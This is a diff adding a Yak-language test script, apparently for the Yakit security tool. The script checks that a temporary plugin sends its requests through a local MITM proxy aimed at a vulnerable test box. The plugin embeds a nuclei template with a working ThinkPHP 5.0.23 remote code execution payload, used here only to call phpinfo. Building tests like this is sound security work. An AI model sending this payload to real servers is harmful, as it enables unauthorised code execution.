@@ -1,0 +1,115 @@
+token = randstr(50)
+targetUrl = getParam("VULINBOX")
+mitmPort = os.GetRandomAvailableTCPPort()
+mitmProxy = "http://127.0.0.1:" + string(mitmPort)
+var count = 0
+go func{
+    err = mitm.Start(mitmPort, mitm.hijackHTTPRequest((https, url, req, forwad, drop) =>{
+        if string(req).Contains(token) {
+            count++
+        }
+    }))
+    die(err)
+}
+mitmAddr = str.HostPort("127.0.0.1", mitmPort)
+dump(mitmAddr)
+err = os.WaitConnect(mitmAddr, 5)
+if err == nil {
+    println("mitm proxy started")
+} else {
+    println("mitm proxy failed")
+    die(err)
+}
+
+println("测试 MITM 基础连接")
+poc.Get(targetUrl, poc.proxy(mitmProxy), poc.timeout(3))~
+
+/*
+CREATE PLUGIN
+*/
+name = db.CreateTemporaryYakScript("mitm", `
+
+` + `constTemplate = nuclei.rawTemplate(` + "`"+ `
+id: mocked
+
+info:
+  name: ThinkPHP 5.0.23 - Remote Code Execution
+  author: dr_set
+  severity: critical
+  description: ThinkPHP 5.0.23 is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
+  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5.0.23-rce
+  tags: thinkphp,rce
+  metadata:
+    max-request: 1
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php?s=captcha&c=Inotify&function=hello&u=` + token + `"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "PHP Extension"
+          - "PHP Version"
+          - "ThinkPHP"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by md on 2022/10/05
+` + "`);" + `
+
+token = ` + codec.StrconvQuote(token)+ `
+mirrorNewWebsite = (isHttps, url, req, rsp, body) => {
+    req = poc.ReplaceHTTPPacketFirstLine(req, "GET / HTTP/1.1")
+    req = poc.ReplaceHTTPPacketHeader(req, "Connection", "close")
+
+    // poc 8 reqs
+    poc.HTTP(req, poc.replaceQueryParam("u", token), poc.timeout(5), poc.https(isHttps))~
+    poc.HTTPEx(req, poc.replaceQueryParam("u", token), poc.timeout(5), poc.https(isHttps))~
+    poc.Get(url, poc.replaceQueryParam("u", token), poc.timeout(5), poc.https(isHttps))~
+    poc.Post(url, poc.replaceQueryParam("u", token), poc.timeout(5), poc.https(isHttps))~
+    poc.Head(url, poc.replaceQueryParam("u", token), poc.timeout(5), poc.https(isHttps))~
+    poc.Delete(url, poc.replaceQueryParam("u", token), poc.timeout(5), poc.https(isHttps))~
+    poc.Options(url, poc.replaceQueryParam("u", token), poc.timeout(5), poc.https(isHttps))~
+    poc.Do("PUT", url, poc.replaceQueryParam("u", token), poc.timeout(5), poc.https(isHttps))~
+
+    // nuclei include 2 reqs
+    for result in nuclei.Scan(url, constTemplate, nuclei.debug(true))~ {
+        dump(result)
+    }
+    nuclei.ScanAuto(url, constTemplate, nuclei.debug(true))~
+
+    // fuzz.HTTPRequest.Exec total 5+5 reqs
+    host, port, _ = str.ParseStringToHostPort(url)
+    for result in fuzz.HTTPRequest("GET / HTTP/1.1\r\n" + "Host: "+ str.HostPort(host, port) + "\r\nConnection: close\r\n", fuzz.https(isHttps))~.FuzzGetParams("u", token).FuzzGetParams("a", "{{int(1-5)}}").Exec()~ {    }
+    for result in fuzz.MustHTTPRequest("GET / HTTP/1.1\r\n" + "Host: "+ str.HostPort(host, port) + "\r\nConnection: close\r\n", fuzz.https(isHttps))~.FuzzGetParams("u", token).FuzzGetParams("a", "{{int(1-5)}}").Exec()~ {   }
+}
+`)~
+
+response = poc.Get(targetUrl)~[0]
+a = hook.NewMixPluginCaller()~
+a.SetProxy(mitmProxy)
+die(a.LoadPlugin(name))
+
+_, body = poc.Split(response.RawPacket)
+a.MirrorHTTPFlow(true, targetUrl, response.RawRequest /*type: bytes*/, response.RawPacket, body)
+
+println("TOTAL EXPECT %v, GOT %v" % [20, count])
+if count == 20 {
+    println("PASSED")
+    return
+}
+die("BindYakitPluginContext ERROR!")
+
+
+
